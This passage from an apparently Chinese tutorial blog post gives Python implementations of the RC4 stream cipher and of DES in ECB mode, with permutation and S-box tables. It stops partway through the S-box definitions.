    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
        S.append(i)
        tmp.append(Key[i % <span class="hljs-built_in">len</span>(Key)])
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
        j = (j + S[i] + <span class="hljs-built_in">ord</span>(tmp[i])) % <span class="hljs-number">256</span>
        S[i], S[j] = S[j], S[i]             <span class="hljs-comment"># 交换S[i],S[j]</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_Encode</span>(<span class="hljs-params">S, plaintext</span>):
    i = j = <span class="hljs-number">0</span>
    result = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> plaintext:
        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>
        j = (j + S[i]) % <span class="hljs-number">256</span>
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % <span class="hljs-number">256</span>
        k = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) ^ S[t])
        result += k
    result = base64.b64encode(result.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))
    result = result.decode()
    <span class="hljs-keyword">return</span> result


<span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_Decode</span>(<span class="hljs-params">S, criphtext</span>):
    i = j = <span class="hljs-number">0</span>
    criphtext = base64.b64decode(criphtext)
    criphtext = <span class="hljs-built_in">str</span>(criphtext.decode())
    result = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> criphtext:
        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>
        j = (j + S[i]) % <span class="hljs-number">256</span>
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % <span class="hljs-number">256</span>
        k = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) ^ S[t])
        result += k
    <span class="hljs-keyword">return</span> result

<span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
        order = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入指令,加密/E,解密/D :&quot;</span>)
        <span class="hljs-keyword">if</span> order.upper() ==<span class="hljs-string">&#x27;E&#x27;</span>:
            plaintext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入明文: &#x27;</span>)
            key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密钥: &quot;</span>)
            s = []
            Rc4_init(s, key)
            cryphtext = rc4_Encode(s, plaintext)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;密文为: &quot;</span>, cryphtext)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)

        <span class="hljs-keyword">else</span>:
            cryphtext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密文: &quot;</span>)
            key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密钥: &quot;</span>)
            s = []
            Rc4_init(s, key)
            plaintext = rc4_Decode(s, cryphtext)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;明文为: &quot;</span>, plaintext)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    main()</code></pre>



<h1 id="三、DES"><a href="#三、DES" class="headerlink" title="三、DES"></a>三、DES</h1><p>DEC_ECB模式</p>
<pre><code class="hljs python"><span class="hljs-comment"># 两字符进行异或运算</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">str1, str2</span>):
    res = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(str1)):
        xor_res = <span class="hljs-built_in">int</span>(str1[i], <span class="hljs-number">10</span>)^<span class="hljs-built_in">int</span>(str2[i], <span class="hljs-number">10</span>)
        <span class="hljs-keyword">if</span> xor_res == <span class="hljs-number">1</span>:
            res += <span class="hljs-string">&#x27;1&#x27;</span>
        <span class="hljs-keyword">else</span>:
            res += <span class="hljs-string">&#x27;0&#x27;</span>
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 处理字符串，将每个字符串都转成八位二进制数</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">str_process</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):
    res = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:
        tmp = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:]
        tmp = (<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(tmp)) * <span class="hljs-string">&#x27;0&#x27;</span> + tmp  <span class="hljs-comment"># 不够八位则在前面补 0</span>
        res += tmp
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># PC-1盒处理</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">key_change_1</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):
    change_table = [<span class="hljs-number">57</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">33</span>,<span class="hljs-number">25</span>,<span class="hljs-number">17</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,
                 <span class="hljs-number">58</span>,<span class="hljs-number">50</span>,<span class="hljs-number">42</span>,<span class="hljs-number">34</span>,<span class="hljs-number">26</span>,<span class="hljs-number">18</span>,<span class="hljs-number">10</span>,
                 <span class="hljs-number">2</span>,<span class="hljs-number">59</span>,<span class="hljs-number">51</span>,<span class="hljs-number">43</span>,<span class="hljs-number">35</span>,<span class="hljs-number">27</span>,<span class="hljs-number">19</span>,<span class="hljs-number">11</span>,
                 <span class="hljs-number">3</span>,<span class="hljs-number">60</span>,<span class="hljs-number">52</span>,<span class="hljs-number">44</span>,<span class="hljs-number">36</span>,<span class="hljs-number">63</span>,<span class="hljs-number">55</span>,<span class="hljs-number">47</span>,
                 <span class="hljs-number">39</span>,<span class="hljs-number">31</span>,<span class="hljs-number">23</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">62</span>,<span class="hljs-number">54</span>,<span class="hljs-number">46</span>,
                 <span class="hljs-number">38</span>,<span class="hljs-number">30</span>,<span class="hljs-number">22</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">61</span>,<span class="hljs-number">53</span>,<span class="hljs-number">45</span>,
                 <span class="hljs-number">37</span>,<span class="hljs-number">29</span>,<span class="hljs-number">21</span>,<span class="hljs-number">13</span>,<span class="hljs-number">5</span>,<span class="hljs-number">28</span>,<span class="hljs-number">20</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>]
    res = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># PC-2盒处理</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">key_change_2</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):
    change_table = [<span class="hljs-number">14</span>,<span class="hljs-number">17</span>,<span class="hljs-number">11</span>,<span class="hljs-number">24</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">28</span>,
                 <span class="hljs-number">15</span>,<span class="hljs-number">6</span>,<span class="hljs-number">21</span>,<span class="hljs-number">10</span>,<span class="hljs-number">23</span>,<span class="hljs-number">19</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,
                 <span class="hljs-number">26</span>,<span class="hljs-number">8</span>,<span class="hljs-number">16</span>,<span class="hljs-number">7</span>,<span class="hljs-number">27</span>,<span class="hljs-number">20</span>,<span class="hljs-number">13</span>,<span class="hljs-number">2</span>,
                 <span class="hljs-number">41</span>,<span class="hljs-number">52</span>,<span class="hljs-number">31</span>,<span class="hljs-number">37</span>,<span class="hljs-number">47</span>,<span class="hljs-number">55</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,
                 <span class="hljs-number">51</span>,<span class="hljs-number">45</span>,<span class="hljs-number">33</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">39</span>,<span class="hljs-number">56</span>,
                 <span class="hljs-number">34</span>,<span class="hljs-number">53</span>,<span class="hljs-number">46</span>,<span class="hljs-number">42</span>,<span class="hljs-number">50</span>,<span class="hljs-number">36</span>,<span class="hljs-number">29</span>,<span class="hljs-number">32</span>]
    res = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res


<span class="hljs-comment"># 循环左移</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">left_run</span>(<span class="hljs-params"><span class="hljs-built_in">str</span>, num</span>):
    tmp_str = <span class="hljs-built_in">str</span>[num:<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)]
    tmp_str = tmp_str+<span class="hljs-built_in">str</span>[<span class="hljs-number">0</span>:num]
    <span class="hljs-keyword">return</span> tmp_str


<span class="hljs-comment"># 生成16个子密钥</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">key_gen</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):
    key_list = []
    key_change_res = key_change_1(<span class="hljs-built_in">str</span>)
    key_c = key_change_res[<span class="hljs-number">0</span>:<span class="hljs-number">28</span>]
    key_d = key_change_res[<span class="hljs-number">28</span>:]
    num = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">17</span>): <span class="hljs-comment">#共16轮</span>
        key_c = left_run(key_c, num[i])
        key_d = left_run(key_d, num[i])
        key_yiwei = key_c + key_d
        key_res = key_change_2(key_yiwei)
        key_list.append(key_res)
    <span class="hljs-keyword">return</span> key_list

<span class="hljs-comment"># IP盒处理</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">begin_change</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):
    change_table = [<span class="hljs-number">58</span>,<span class="hljs-number">50</span>,<span class="hljs-number">42</span>,<span class="hljs-number">34</span>,<span class="hljs-number">26</span>,<span class="hljs-number">18</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,
                   <span class="hljs-number">60</span>,<span class="hljs-number">52</span>,<span class="hljs-number">44</span>,<span class="hljs-number">36</span>,<span class="hljs-number">28</span>,<span class="hljs-number">20</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,
                   <span class="hljs-number">62</span>,<span class="hljs-number">54</span>,<span class="hljs-number">46</span>,<span class="hljs-number">38</span>,<span class="hljs-number">30</span>,<span class="hljs-number">22</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,
                   <span class="hljs-number">64</span>,<span class="hljs-number">56</span>,<span class="hljs-number">48</span>,<span class="hljs-number">40</span>,<span class="hljs-number">32</span>,<span class="hljs-number">24</span>,<span class="hljs-number">16</span>,<span class="hljs-number">8</span>,
                   <span class="hljs-number">57</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">33</span>,<span class="hljs-number">25</span>,<span class="hljs-number">17</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,
                   <span class="hljs-number">59</span>,<span class="hljs-number">51</span>,<span class="hljs-number">43</span>,<span class="hljs-number">35</span>,<span class="hljs-number">27</span>,<span class="hljs-number">19</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,
                   <span class="hljs-number">61</span>,<span class="hljs-number">53</span>,<span class="hljs-number">45</span>,<span class="hljs-number">37</span>,<span class="hljs-number">29</span>,<span class="hljs-number">21</span>,<span class="hljs-number">13</span>,<span class="hljs-number">5</span>,
                   <span class="hljs-number">63</span>,<span class="hljs-number">55</span>,<span class="hljs-number">47</span>,<span class="hljs-number">39</span>,<span class="hljs-number">31</span>,<span class="hljs-number">23</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>]
    res = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res


<span class="hljs-comment"># E盒处理  32位-&gt;48位</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">E_box</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):
    change_table = [<span class="hljs-number">32</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,
                    <span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,
                    <span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,
                    <span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,
                    <span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">26</span>,<span class="hljs-number">27</span>,
                    <span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">30</span>,<span class="hljs-number">31</span>,<span class="hljs-number">32</span>,<span class="hljs-number">1</span>]
    res = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># s盒处理   48位-&gt;32位</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">S_box</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):
    j = <span class="hljs-number">0</span>
    s_list = [[<span class="hljs-number">14</span>,<span class="hljs-number">4</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">13</span>],
              [<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">13</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">15</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">14</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>],
              [<span class="hljs-number">10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">15</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">15</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>],
              [<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>],
              [<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">15</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>],
              [<span class="hljs-number">12</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">15</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">14</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>],
              [<span class="hljs-number">4</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">12</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">11</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">14</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">12</span>],
